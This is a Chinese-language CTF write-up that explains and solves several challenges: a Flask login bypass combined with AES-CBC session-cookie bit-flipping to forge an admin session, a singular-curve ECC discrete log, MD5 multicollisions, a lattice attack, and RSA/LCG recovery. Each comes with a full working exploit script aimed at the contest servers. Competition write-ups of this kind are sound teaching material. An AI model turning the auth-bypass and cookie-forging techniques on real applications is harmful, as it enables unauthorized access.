---
title: Polaris_CTF
date: 2026-03-30 17:31:53
tags:
---

## app.py 
### 题目
```py
from flask import Flask, request, make_response, render_template, redirect, url_for, abort
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os

app = Flask(__name__)
KEY = os.getenv("SECRET_KEY", os.urandom(16))
ADMIN_PASS = os.getenv("ADMIN_PASS", "admin123")
FLAG = os.getenv("FLAG", "XMCTF{xxxxxx}")

# 初始数据，禁止注册 admin
USERS = {"admin": ADMIN_PASS}

def get_session_data(token_hex):
    if not token_hex: return None
    data = bytes.fromhex(token_hex)
    iv, ct = data[:16], data[16:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(ct)
    print(decrypted)
    return unpad(decrypted, 16).decode(errors='ignore')

def create_session(username):
    iv = os.urandom(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    msg = f"user={username}".encode()
    ct = cipher.encrypt(pad(msg, 16))
    return (iv + ct).hex()

@app.route('/')
def index():
    token = request.cookies.get('session')
    if not token:
        return redirect(url_for('login_page'))
    
    try:
        msg = get_session_data(token)
        if not msg or not msg.startswith("user="):
            return redirect(url_for('login_page'))
        
        username = msg[5:]
    except:
        abort(500, description="Invalid Session")
    
    return render_template('index.html', username=username, flag=FLAG if username == "admin" else None)

@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'GET':
        return render_template('login.html')
    
    user = request.form.get('username')
    pw = request.form.get('password')
    
    if USERS.get(user) == pw:
        resp = make_response(redirect(url_for('index')))
        resp.set_cookie('session', create_session(user))
        return resp
    return "Invalid username or password", 403

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```

### 分析

题目给了一个 Flask 应用，核心逻辑如下：

```python
USERS = {"admin": ADMIN_PASS}

if USERS.get(user) == pw:
    resp = make_response(redirect(url_for('index')))
    resp.set_cookie('session', create_session(user))
    return resp
```

登录成功后会下发一个 `session` cookie，而这个 cookie 的生成方式是：

```python
def create_session(username):
    iv = os.urandom(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    msg = f"user={username}".encode()
    ct = cipher.encrypt(pad(msg, 16))
    return (iv + ct).hex()
```

服务端读取 cookie 时会直接解密：

```python
def get_session_data(token_hex):
    data = bytes.fromhex(token_hex)
    iv, ct = data[:16], data[16:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(ct)
    return unpad(decrypted, 16).decode(errors='ignore')
```

最后在首页里判断用户名是否为 `admin`，如果是就显示 flag。

#### 1：登录绕过

登录校验写成了：

```python
if USERS.get(user) == pw:
```

如果 `user` 不存在，那么 `USERS.get(user)` 返回 `None`。  
如果我们不传 `password`， `request.form.get('password')` 也是 `None`。

于是：

```python
None == None
```
结果为真

例如发送：

```http
POST /login

username=guest
```

就能拿到一个合法的 `session`。

#### 2：CBC 无完整性校验，可篡改明文
拿到 session 后，我去看 cookie 是怎么生成和解析的：

```py
def create_session(username):
    iv = os.urandom(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    msg = f"user={username}".encode()
    ct = cipher.encrypt(pad(msg, 16))
    return (iv + ct).hex()
```

```py
def get_session_data(token_hex):
    data = bytes.fromhex(token_hex)
    iv, ct = data[:16], data[16:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(ct)
    return unpad(decrypted, 16).decode(errors='ignore')
```

看到这里基本就可以确定方向了：它只做了 CBC 加密，没有签名，没有 MAC，也没有额外完整性校验。

这类 session 我一般都会先问自己一句：我能不能不解密，只改它的明文含义？

答案是可以，因为 CBC 第一块满足：

```text
P1 = D(C1) xor IV
```

因此如果我们修改 IV，就可以精准修改第一块明文，而不需要知道密钥。

题目生成的明文格式是：

```text
user=<username>
```

我们先登录得到：

```text
user=guest
```

再把它翻成：

```text
user=admin
```

之所以选择 `guest`，是因为它和 `admin` 都是 5 个字符，修改后长度不变，padding 也保持一致。

第一块明文分别为：

```python
original = b"user=guest".ljust(16, b"\x06")
target   = b"user=admin".ljust(16, b"\x06")
```
所以新的 IV 为：

```python
IV' = IV ^ original ^ target
```

然后把新的 `IV'` 和原来的密文拼回去，就得到一个解密后为 `user=admin` 的新 cookie。

### exp 

```python
import http.cookiejar
import re
import urllib.parse
import urllib.request

HOST = "http://nc1.ctfplus.cn:19723"


def xor_bytes(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def forge_admin_cookie(cookie_hex: str) -> str:
    raw = bytes.fromhex(cookie_hex)
    iv, ct = raw[:16], raw[16:]

    original = b"user=guest".ljust(16, bytes([6]))
    target = b"user=admin".ljust(16, bytes([6]))
    forged_iv = xor_bytes(iv, xor_bytes(original, target))
    return (forged_iv + ct).hex()


jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

data = urllib.parse.urlencode({"username": "guest"}).encode()
req = urllib.request.Request(f"{HOST}/login", data=data, method="POST")
opener.open(req)

session = None
for cookie in jar:
    if cookie.name == "session":
        session = cookie.value
        break

forged = forge_admin_cookie(session)
req = urllib.request.Request(f"{HOST}/")
req.add_header("Cookie", f"session={forged}")
body = opener.open(req).read().decode("utf-8", "ignore")

print(body)
print(re.search(r"xmctf\\{[^}]+\\}", body, re.IGNORECASE).group(0))
```

### 总结

核心是两个经典问题：

1. 登录逻辑，导致 `None == None` 可以绕过认证。
2. session 只做了 CBC 加密，没有做完整性保护，导致可以通过修改 IV 篡改第一块明文。

拿到任意普通用户 session 后，利用 CBC bit flipping 把 `user=guest` 改成 `user=admin`，即可得到 flag。


## ecc
### 题目：
```py
from Crypto.Util.number import *
from secrets import flag

p = 9259018534502783714631247560818133078409930397939705162361230465031580254504264713899169170790687716589100652406132800533397486109926387016562663961524649
a = 0
b = 6235467631650349040636525320446729529985562949423449382969614887116983248527693872546808737512375916974084741892428681798937790855872528526403738040908493
c = 4165903654767429195543540819098180314477702137507994424192636596518008877139978822038616746899053449640020812062736993008962585578921635697413459959685760
d = 1889382340373247565387211782596794283852946561870564309251998196824383297786878212641581641540685106266683503654620956037368416192796434147249748216284648
e = 3015564788819504594313842562882781366361783108618226049128986996153057550014499326419988348165744003693083108924831219996703133056523468396967900376388617


def add(P1, P2):
    if P1 is None:
        return P2

    x1, y1 = P1
    x2, y2 = P2

    l = (y2 - y1) * pow(x2 - x1, -1, p) % p
    x3 = (l**2 + a * l - b - x1 - x2) % p
    y3 = (l * (x1 - x3) - y1 - a * x3 - c) % p
    return (x3, y3)


def double(P):
    if P is None:
        return None

    x, y = P

    denom = (2 * y + a * x + c) % p
    num = (3 * x**2 + 2 * b * x + d - a * y) % p
    l = (num * pow(denom, -1, p)) % p
    x3 = (l**2 + a * l - b - 2 * x) % p
    y3 = (l * (x - x3) - y - a * x3 - c) % p
    return (x3, y3)


def mul(k, P):
    Q = None
    while k:
        if k & 1:
            Q = add(Q, P)
        P = double(P)
        k >>= 1
    return Q


m = bytes_to_long(flag)
G = (1244884551970947614719458919805713649754289814760243366205012699871413235954279930743612403791919112394457579170253990713250052822262255880036254772609156, 4579639528751113977115209571728128585569082149696598770106934145500742785077382446292613925719404433141749168427443122707253164477493499731016883616496009)
P = mul(m, G)
print(P)

# (9039120379228240875764080238389949393433230267005269099421166553853462484353350917730468887801035670710981414900285176863179650428412616144755102163764906, 6266065680737729548475090556806928225106996606788926050268440244885398464756877886842570309216095272026404453765198968208595242208306240371310555394416694)

```
### 分析
#### 1. 题目在做什么

题目给了点加、倍点、标量乘：
```Python
P = mul(m, G)
```
看起来就是：
* 给定基点 `G`
* 给定结果点 `P`
* 求未知标量 `m`

首先想到有没有群阶漏洞、能不能Pohlig-Hellman或者是p-adic
但是尝试之后发现无果
拷打ai后发现曲线本身具有特殊性

如果曲线真的是一条**非奇异椭圆曲线**，那通常很难做。
但这题的坑在于：**它虽然用了椭圆曲线的公式，曲线本身却是奇异的。**
#### 曲线分析
$$y^2 + cy = x^3 + bx^2 + dx + e$$
令：
$$Y = y + \frac c2$$
$$y^2 + cy = \left(y+\frac c2\right)^2 - \frac{c^2}{4}$$
移项以后得到：
$$Y^2 = x^3 + bx^2 + dx + e + \frac{c^2}{4}$$
对左式因式分解
但这里一分解发现：
$$x^3 + bx^2 + dx + e + \frac{c^2}{4} = (x-r)^3$$
也就是：
$$Y^2 = (x-r)^3$$
这就很关键了。
发现这个曲线是**奇异三次曲线**
> **奇异三次曲线上的“群”通常会退化成更简单的代数结构。**

原来难的离散对数：
$$P = [m]G$$
会塌成一个线性关系：
$$s(P)=m\cdot s(G)$$
于是：
$$m = \frac{s(P)}{s(G)}$$

#### S是什么
$$Y^2=u^3$$

左边是平方，右边是立方，让它们都等于某个六次方。于是设

$$u=s^2,\qquad Y=s^3$$

立刻有

$$Y^2=(s^3)^2=s^6,\qquad u^3=(s^2)^3=s^6$$

所以自动满足

$$Y^2=u^3$$

因此曲线上点可以写成

$$u=s^2,\qquad Y=s^3$$

再换回原变量：

$$x=r+s^2,\qquad y=s^3-\frac c2$$

这就是这条奇异曲线的一组参数表示。
### exp
```py
from sage.all import *
from Crypto.Util.number import long_to_bytes

p = 9259018534502783714631247560818133078409930397939705162361230465031580254504264713899169170790687716589100652406132800533397486109926387016562663961524649
b = 6235467631650349040636525320446729529985562949423449382969614887116983248527693872546808737512375916974084741892428681798937790855872528526403738040908493
c = 4165903654767429195543540819098180314477702137507994424192636596518008877139978822038616746899053449640020812062736993008962585578921635697413459959685760
d = 1889382340373247565387211782596794283852946561870564309251998196824383297786878212641581641540685106266683503654620956037368416192796434147249748216284648
e = 3015564788819504594313842562882781366361783108618226049128986996153057550014499326419988348165744003693083108924831219996703133056523468396967900376388617

gx, gy = 1244884551970947614719458919805713649754289814760243366205012699871413235954279930743612403791919112394457579170253990713250052822262255880036254772609156, 4579639528751113977115209571728128585569082149696598770106934145500742785077382446292613925719404433141749168427443122707253164477493499731016883616496009
px, py = 9039120379228240875764080238389949393433230267005269099421166553853462484353350917730468887801035670710981414900285176863179650428412616144755102163764906, 6266065680737729548475090556806928225106996606788926050268440244885398464756877886842570309216095272026404453765198968208595242208306240371310555394416694

F = GF(p)
R.<x> = PolynomialRing(F)
f = x^3 + F(b)*x^2 + F(d)*x + F(e) + F(c)^2/4

print(factor(f))
r = f.roots(multiplicities=False)[0]

tg = (F(gx) - r) / (F(gy) + F(c)/2)
tp = (F(px) - r) / (F(py) + F(c)/2)

m = ZZ(tp / tg)
print(m)
print(long_to_bytes(int(m)))
```
## truck
### 题目
```py
from hashlib import md5
from secret import flag

_H = lambda m: md5(m).digest()

S = set()

for _ in range(10):
    A, B, C = bytes.fromhex(input('A > ')), bytes.fromhex(input('B > ')), bytes.fromhex(input('C > '))
    ha, hb, hc = _H(A), _H(B), _H(C)
    assert ha == hb == hc

    D, E, F = bytes.fromhex(input('D > ')), bytes.fromhex(input('E > ')), bytes.fromhex(input('F > '))
    hd, he, hf = _H(ha + D), _H(hb + E), _H(hc + F)
    assert hd == he == hf

    G, H, I = bytes.fromhex(input('G > ')), bytes.fromhex(input('H > ')), bytes.fromhex(input('I > '))
    assert _H(hd + G) == _H(he + H) == _H(hf + I)

    cur = (A, B, C, D, E, F, G, H, I)
    assert len(set(cur)) == 9
    assert not any(x in S for x in cur) 
    S.update(cur)

print(f'good: {flag}')

```
### 提姆分析
题目每轮读入 9 个十六进制串：

* 第一层：`A, B, C`
* 第二层：`D, E, F`
* 第三层：`G, H, I`

校验逻辑是：

```Python
ha, hb, hc = md5(A), md5(B), md5(C)  
assert ha == hb == hc  
  
hd, he, hf = md5(ha + D), md5(hb + E), md5(hc + F)  
assert hd == he == hf  
  
assert md5(hd + G) == md5(he + H) == md5(hf + I)
```
同时要求：
* `A ~ I` 这 9 个串两两不同
* 所有轮次历史输入不能重复
* 共做 10 轮，全部通过才出 flag。

题目虽然表面上要求“三碰撞”，但实际上每一层都只是：

* 给定一个**相同前缀**
* 找三个不同后缀
* 使得 MD5 相等

而 `fastcoll` 恰好可以在**相同前缀**下做 MD5 二碰撞，因此本题并不需要真的去实现“三碰撞算法”，只要把二碰撞拼成更多碰撞

第一层：构造 `A, B, C`

直接找三个完整消息，使得：

$$MD5(A)=MD5(B)=MD5(C)$$
第二层：构造 `D, E, F`

第二层比较的是：

$$MD5(ha+D),\ MD5(hb+E),\ MD5(hc+F)$$

而第一层已经保证：

$$ha=hb=hc$$

所以第二层本质上是在同一个前缀 `ha` 下，找 3 个不同后缀 `D, E, F`，使得：

$$MD5(ha+D)=MD5(ha+E)=MD5(ha+F)$$

因此只需要把 `ha = MD5(A).digest()` 作为公共前缀，再做一次四碰撞
第三层同理

### exp
```py
#!/usr/bin/env python3
import os
import subprocess
import tempfile
from hashlib import md5
from pwn import remote

FASTCOLL = "/root/.openclaw/workspace/fastcoll"
HOST = "nc1.ctfplus.cn"
PORT = 24915

#nc1.ctfplus.cn 24915
def H(x: bytes) -> bytes:
    return md5(x).digest()


def run_fastcoll(prefix: bytes):
    with tempfile.TemporaryDirectory() as td:
        pf = os.path.join(td, "prefix.bin")
        a = os.path.join(td, "a.bin")
        b = os.path.join(td, "b.bin")
        with open(pf, "wb") as f:
            f.write(prefix)

        subprocess.check_call(
            [FASTCOLL, "-p", pf, "-o", a, b],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

        with open(a, "rb") as f:
            x = f.read()
        with open(b, "rb") as f:
            y = f.read()

    assert x != y
    assert H(x) == H(y)
    assert x.startswith(prefix) and y.startswith(prefix)
    return x, y


def four_collision(prefix: bytes):
    m0, m1 = run_fastcoll(prefix)
    n0, n1 = run_fastcoll(m0)

    y0 = n0[len(m0):]
    y1 = n1[len(m0):]

    c0 = m0 + y0
    c1 = m0 + y1
    c2 = m1 + y0
    c3 = m1 + y1

    h = H(c0)
    assert H(c1) == h
    assert H(c2) == h
    assert H(c3) == h
    assert len({c0, c1, c2, c3}) == 4
    return c0, c1, c2, c3


def three_full_msgs(prefix: bytes):
    c0, c1, c2, _ = four_collision(prefix)
    return c0, c1, c2


def three_suffixes(prefix: bytes):
    c0, c1, c2, _ = four_collision(prefix)
    return c0[len(prefix):], c1[len(prefix):], c2[len(prefix):]


def send_hex(io, prompt: bytes, data: bytes):
    io.sendlineafter(prompt, data.hex().encode())


def build_round(r: int):
    prefix1 = f"round-{r:02d}|".encode()
    A, B, C = three_full_msgs(prefix1)
    ha = H(A)
    assert H(B) == ha and H(C) == ha

    D, E, F = three_suffixes(ha)
    hd = H(ha + D)
    assert H(ha + E) == hd and H(ha + F) == hd

    G, HH, I = three_suffixes(hd)
    last = H(hd + G)
    assert H(hd + HH) == last and H(hd + I) == last

    cur = [A, B, C, D, E, F, G, HH, I]
    assert len(set(cur)) == 9
    return cur


def main():
    used = set()
    rounds = []

    for r in range(10):
        while True:
            vals = build_round(r)
            if any(x in used for x in vals):
                continue
            used.update(vals)
            rounds.append(vals)
            print(f"[+] built round {r}")
            break

    io = remote(HOST, PORT)

    for vals in rounds:
        A, B, C, D, E, F, G, HH, I = vals
        send_hex(io, b"A > ", A)
        send_hex(io, b"B > ", B)
        send_hex(io, b"C > ", C)
        send_hex(io, b"D > ", D)
        send_hex(io, b"E > ", E)
        send_hex(io, b"F > ", F)
        send_hex(io, b"G > ", G)
        send_hex(io, b"H > ", HH)
        send_hex(io, b"I > ", I)

    io.interactive()


if __name__ == "__main__":
    main()
```
## sda
### 题目
```py
from sage.all import *
from Crypto.Util.number import *
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
from secret import flag,x1,x2,x3,y,z1,z2,z3,alpha
import hashlib

A1 = 234110215243875326749544596075512335544257
B1 = 68765596672109672407420253033782942222910  
A2 = 636185906634748653451789798738597280632127
B2 = 131860738134887128678021271054606611917493 
A3 = 905712574946398586494048707872100065355613
B3 = 197958111431918701470218006359610095848736

As = [A1, A2, A3]    
Bs = [B1, B2, B3]    
xs = [x1, x2, x3]
zs = [z1, z2, z3]
A = max(As)          

k = 3    
delta = (k * (2 * alpha - 1)) / (2 * (k + 1))

for i in range(k):
    Ai = As[i]
    pi, qi = factor(Ai)[0][0], factor(Ai)[1][0]  
    z_abs_bound = ((pi - qi) / (3 * (pi + qi))) * (y**2) * (Ai**(1/4))
    assert xs[i]**2 < A**delta
    assert y**2 < A**delta
    assert Bs[i] * xs[i]**2 - y**2 * euler_phi(Ai) == zs[i]
    assert abs(zs[i]) < z_abs_bound

key_material_int = y**2 + x1**2 * x2**2 * x3**2
key_material_bytes = long_to_bytes(key_material_int)
aes_key = hashlib.sha256(key_material_bytes).digest()[:16]

cipher = AES.new(aes_key, AES.MODE_CBC)
iv = cipher.iv
ciphertext = cipher.encrypt(pad(flag, AES.block_size))

print(iv.hex() + ciphertext.hex())
"""
93192f46a00b2dade984ca758706b00681263a8536d8051aff0206d257ce4c2aad6bc017138d4c7aeaed5c8fc2c1ea2f3cec3fbd9201bb5844fa8143d6630944
"""
```
### 分析
核心：
$$B_i x_i^2 - y^2\varphi(A_i)=z_i$$
做一个换元，把问题改成线性的
令
$$U_1=x_1^2,\quad U_2=x_2^2,\quad U_3=x_3^2,\quad Y=y^2$$

那么三条式子变成：

$$B_1U_1-\varphi(A_1)Y=z_1$$ 
$$B_2U_2-\varphi(A_2)Y=z_2$$ 
$$B_3U_3-\varphi(A_3)Y=z_3$$

现在未知量变成了：
* $U_1,U_2,U_3,Y$ 四个小整数
* $z_1,z_2,z_3$ 三个更小的误差

同时题目还给了一堆约束

主变量不大，误差更小，还有多条线性关系”的味道

不难想到要做**LLL**求解

$\boldsymbol{B}=
\begin{pmatrix}
S & 0 & 0 & 0 & B_1 & 0 & 0 \\
0 & S & 0 & 0 & 0 & B_2 & 0 \\
0 & 0 & S & 0 & 0 & 0 & B_3 \\
0 & 0 & 0 & S & -\varphi_1 & -\varphi_2 & -\varphi_3
\end{pmatrix}$

于是：
$(U_1,U_2,U_3,Y)\cdot  
B
=(SU_1,\ SU_2,\ SU_3,\ SY,\ z_1,\ z_2,\ z_3)$
$S$是配置的系数
对其做lll,就能解出$U_1,U_2,U_3,Y$
再去恢复 AES key就好

### exp
```py
from sympy import Matrix, factorint
from Crypto.Util.number import long_to_bytes
from Crypto.Util.Padding import unpad
from Crypto.Cipher import AES
import hashlib

A1 = 234110215243875326749544596075512335544257
B1 = 68765596672109672407420253033782942222910
A2 = 636185906634748653451789798738597280632127
B2 = 131860738134887128678021271054606611917493
A3 = 905712574946398586494048707872100065355613
B3 = 197958111431918701470218006359610095848736

As = [A1, A2, A3]
Bs = [B1, B2, B3]

phis = []
for A in As:
    fac = list(factorint(A).keys())
    p, q = fac[0], fac[1]
    phis.append((p - 1) * (q - 1))

S = 1 << 36
M = Matrix([
    [S, 0, 0, 0, Bs[0],      0,      0],
    [0, S, 0, 0,      0, Bs[1],      0],
    [0, 0, S, 0,      0,      0, Bs[2]],
    [0, 0, 0, S, -phis[0], -phis[1], -phis[2]],
])

L = M.lll()
row = L.tolist()[0]          
U1, U2, U3, Y = [abs(x) // S for x in row[:4]]
z1, z2, z3 = row[4:]

hexdata = "93192f46a00b2dade984ca758706b00681263a8536d8051aff0206d257ce4c2aad6bc017138d4c7aeaed5c8fc2c1ea2f3cec3fbd9201bb5844fa8143d6630944"
iv = bytes.fromhex(hexdata[:32])
ct = bytes.fromhex(hexdata[32:])

key_material_int = Y + U1 * U2 * U3
key_material_bytes = long_to_bytes(key_material_int)
aes_key = hashlib.sha256(key_material_bytes).digest()[:16]

pt = AES.new(aes_key, AES.MODE_CBC, iv).decrypt(ct)
print(unpad(pt, 16).decode())
```

## RSA_LCG
### 题目
```py
from Crypto.Util.number import getPrime, bytes_to_long
import random
import os
import signal

FLAG = os.environ.get("FLAG", "XMCTF{fake_flag}")
secret = os.urandom(64)

e = 263
bit_length = 1024


def get_rsa_params():
    p = getPrime(bit_length)
    q = getPrime(bit_length)
    N = p * q
    return N


class RSA_LCG:
    def __init__(self, seed, a, b, N):
        self.seed = seed
        self.a = a
        self.b = b
        self.N = N
        self.e = e

    def leak_params(self):

        diff = (self.b - self.a) % self.N
        leak_diff_e = pow(diff, self.e, self.N)

        return  self.a, leak_diff_e


    def next(self):

        self.seed = (self.a * self.seed + self.b) % self.N

        return pow(self.seed, self.e, self.N)


def challenge():

    N = get_rsa_params()

    seed = bytes_to_long(secret)
    assert seed < N

    a = random.getrandbits(bit_length)
    b = random.getrandbits(bit_length)

    rsa_lcg = RSA_LCG(seed, a, b, N)

    print(f"N = {N}")
    print(f"e = {e}")
    print("-" * 30)


    leak = rsa_lcg.leak_params()
    print(f"[+] leak: {leak}")


    out1 = rsa_lcg.next()
    print(f"[+] Output 1: {out1}")

    out2 = rsa_lcg.next()
    print(f"[+] Output 2: {out2}")


if __name__ == "__main__":
    challenge()
    signal.alarm(4)
    guess_hex = input("secret (hex): ").strip()
    guess = bytes.fromhex(guess_hex)
    if guess == secret:
        print(f"Good! Here is your flag: {FLAG}")
```
### 分析

这题看着像 RSA，其实重点不在分解 `N`，也不在硬开 e 次根，而是在利用几个 RSA 幂值之间的关系把内部状态抠出来。

#### 题目在做什么

内部递推是一个仿射 LCG：

```text
x1 = a*seed + b
x2 = a*x1 + b
```

题目给你的不是 `x1`、`x2`，而是：

```text
a
(b-a)^e
x1^e
x2^e
```

其中 `e = 263`，目标是恢复最开始的 64 字节 `secret`。

#### 换个变量

设：

```text
d = b-a
```

那么：

```text
b = d+a
x2 = a*x1 + b = a*(x1+1) + d
```

这样未知量就只剩两个：`x1` 和 `d`，并且满足：

```text
x1^e = y1
d^e  = c
(a*(x1+1)+d)^e = y2
```

#### 核心：先把 d 消掉

把 `d` 记成变量 `Z`，把 `a*(x1+1)` 记成 `T`，就有：

```text
Z^e - c = 0
(T+Z)^e - y2 = 0
```

对 `Z` 取结果式：

```text
R(T) = Res_Z(Z^e-c, (T+Z)^e-y2)
```

它的意义就是：只要某个 `T` 能让这两条方程有公共根，就一定满足 `R(T)=0`。

真实情况下公共根就是 `Z=d`，而对应的：

```text
T = a*(x1+1)
```

所以：

```text
R(a*(x1+1)) = 0
```

#### 解出出 x1

题目还给了：

```text
x1^e = y1
```

所以 `x1` 同时满足：

```text
X^e - y1 = 0
R(a*(X+1)) = 0
```

也就是说，`x1` 是这两个多项式的公共根。  
直接做：

```text
gcd(X^e-y1, R(a*(X+1)))
```

就能拿到 `x1`。

#### 求 d

有了 `x1` 之后，`d` 满足：

```text
d^e = c
(d + a*(x1+1))^e = y2
```

再做一次：

```text
gcd(Y^e-c, (Y+a*(x1+1))^e-y2)
```

就能恢复 `d`。

#### 还原 secret

因为：

```text
x1 = a*seed + b
b = d + a
```

所以：

```text
seed = (x1-b)/a
     = (x1-d-a)/a
     = (x1-d)/a - 1 mod N
```

把这个 `seed` 转成 64 字节，就是题目要的 `secret`。

#### 难点：

思路其实不难，难的是 4 秒时限。

如果直接硬算结果式 `R(T)` 会非常大，根本来不及。  
关键优化是利用它只含 `T^e, T^(2e), ...` 这些项，所以可以写成：

```text
R(T) = Phi(T^e)
```

其中 `Phi` 只是一个 263 次多项式。  
所以实际做法不是硬展开大结果式，而是先恢复这个较小的 `Phi`，再去做 gcd。

### exp
```py
from sage.all import Integers, PolynomialRing, inverse_mod
import socket
import re

HOST = "nc1.ctfplus.cn"
PORT = 26179
E = 263
PROMPT = b"secret (hex): "

def monic_gcd(f, g):
    while not g.is_zero():
        r = f % g
        f, g = g.monic(), r.monic() if not r.is_zero() else r
    return f.monic()

def precompute_blocks():
    blocks = [1]
    for k in range(1, E + 1):
        x = 1
        for t in range(1, E + 1):
            x *= E * (k - 1) + t
        blocks.append(x)
    return blocks

BLOCKS = precompute_blocks()

def build_phi_coeffs(c, y2, N):
    coeffs = []
    pows_c = [1]
    pows_y2 = [1]
    for _ in range(E):
        pows_c.append((pows_c[-1] * c) % N)
        pows_y2.append((pows_y2[-1] * y2) % N)

    inv = [0] + [pow(i, -1, N) for i in range(1, E + 1)]
    block = [x % N for x in BLOCKS]
    block_inv = [0] + [pow(block[i], -1, N) for i in range(1, E + 1)]

    power_sums = [0]
    for m in range(1, E + 1):
        s = 0
        comb = 1
        for j in range(m + 1):
            term = comb * pows_c[m - j] % N * pows_y2[j] % N
            s = (s - term) % N if (m - j) & 1 else (s + term) % N
            if j != m:
                comb = comb * block[m - j] % N * block_inv[j + 1] % N
        power_sums.append(s * E % N)

        cur = power_sums[m]
        for i in range(1, m):
            cur += coeffs[i - 1] * power_sums[m - i]
        coeffs.append((-cur * inv[m]) % N)
    return coeffs

def recover_secret(N, a, c, y1, y2):
    ring = Integers(N)
    coeffs = build_phi_coeffs(c, y2, N)

    RX = PolynomialRing(ring, "X")
    X = RX.gen()
    fx = X**E - ring(y1)
    w = ring(pow(a, E, N)) * (X + 1) ** E % fx

    gx = RX.one()
    for coef in coeffs:
        gx = (gx * w + RX(coef)) % fx
    gx = monic_gcd(fx, gx)
    x1 = int(-gx[0]) % N

    RY = PolynomialRing(ring, "Y")
    Y = RY.gen()
    gd = monic_gcd(Y**E - ring(c), (Y + ring(a) * (ring(x1) + 1)) ** E - ring(y2))
    d = int(-gd[0]) % N

    seed = int((ring(x1 - d) * inverse_mod(ring(a), N) - 1)) % N
    return seed.to_bytes(64, "big")

def recv_until(sock, marker):
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def parse(blob):
    text = blob.decode()
    N = int(re.search(r"N = (\d+)", text).group(1))
    a, c = map(int, re.search(r"\[\+\] leak: \((\d+), (\d+)\)", text).groups())
    y1 = int(re.search(r"\[\+\] Output 1: (\d+)", text).group(1))
    y2 = int(re.search(r"\[\+\] Output 2: (\d+)", text).group(1))
    return N, a, c, y1, y2

with socket.create_connection((HOST, PORT)) as io:
    blob = recv_until(io, PROMPT)
    N, a, c, y1, y2 = parse(blob)
    secret = recover_secret(N, a, c, y1, y2)
    io.sendall(secret.hex().encode() + b"\n")
    print(blob.decode(), end="")
    print(recv_until(io, b"\n").decode(), end="")
```


---

待补充：
## 神秘学
### 分析
1. RSA 加解密关系反转

题目中的公钥指数不是常见的 `65537`，而是：

$$e = inverse(c, (p-1)(q-1))$$

即：

$$e \equiv c^{-1} \pmod{\varphi(n)}$$
 
所以只要求出 `c`，就能直接解密：


#### 多项式分析
$$poly(x)=x^3-a x^2+b x-c-k n$$

对其求导：

$$poly'(x)=3x^2-2ax+b$$

在 $(x_1,a_1,b_1)$ 处代入后得到：

$$deriv1\_num=3x_1^2-2a_1x_1+b_1$$

整理一下：

$$a_1=\frac{3x_1^2-deriv1\_num+b_1}{2x_1}$$
#### 还原$a_1,b_1$
这里的关键是量级差：

* $x_1$ 是 512 bit 量级大数
* $a_1,b_1$ 只有 120 bit 左右

因此上式中

$$\frac{b_1}{2x_1}$$
非常小，几乎可以忽略。于是有近似：
$$a_1 \approx \frac{3x_1^2-deriv1\_num}{2x_1}$$
当枚举到候选的 `a1` 后，可以由
$$b_1 = deriv1\_num - 3x_1^2 + 2a_1x_1$$
直接求出 `b1`
#### 还原c
然后ai说:
$$poly(x_1)=0$$
???不懂???
移项可得：
$$c=x_1^3-a_1x_1^2+b_1x_1-k n$$
求出c
其中 `k` 是 8 bit 素数，所以直解爆破即可


### exp
```py
from Crypto.Util.number import long_to_bytes, isPrime

n = 63407394080105297388278430339692150920405158535377818019441803333853224630295862056336407010055412087494487003367799443217769754070745006473326062662322624498633283896600769211094059989665020951007831936771352988585565884180663310304029530702695576386164726400928158921458173971287469220518032325956366276127
x1 = 3481408902400626584294863390184557833125008467348169645656825368985677578418186933223051810792813745190000132321911937970968840332589150965113386330575858
deriv1_num = 36360623837143006554133449776905822223850034204333042340303731846698251185379183585401025894584873826284649058526470710038176516677326058549625930550928515944115160614909195746688504416967586844354012895944251800672195553936202084073217078119494546421088598245791873936703883718926122761577400400368341859847
cipher = 17359360992646515022812225990358117265652240629363564764503325024700251560440679272576574598620940996876220276588413345495658258508097150181947839726337961689195064024953824539654084620226127592330054674517861032601638881355220119605821814412919221685287567648072575917662044603845424779210032794782725398473

x1_sq = x1 * x1
x1_cb = x1_sq * x1

for k in [i for i in range(2, 256) if isPrime(i)]:
    L = (2**119) - deriv1_num + 3 * x1_sq
    R = (2**120) - deriv1_num + 3 * x1_sq
    den = 2 * x1

    a1_l = max(2**119, (L + den - 1) // den)
    a1_r = min(2**120, R // den)

    for a1 in range(a1_l, a1_r + 1):
        b1 = deriv1_num - 3 * x1_sq + 2 * a1 * x1
        if not (2**119 <= b1 <= 2**120):
            continue

        c = x1_cb - a1 * x1_sq + b1 * x1 - k * n
        if c <= 0:
            continue

        m = pow(cipher, c, n)
        flag = long_to_bytes(m)
        if b"xmctf{" in flag.lower():
            print(flag.decode())
            raise SystemExit
```




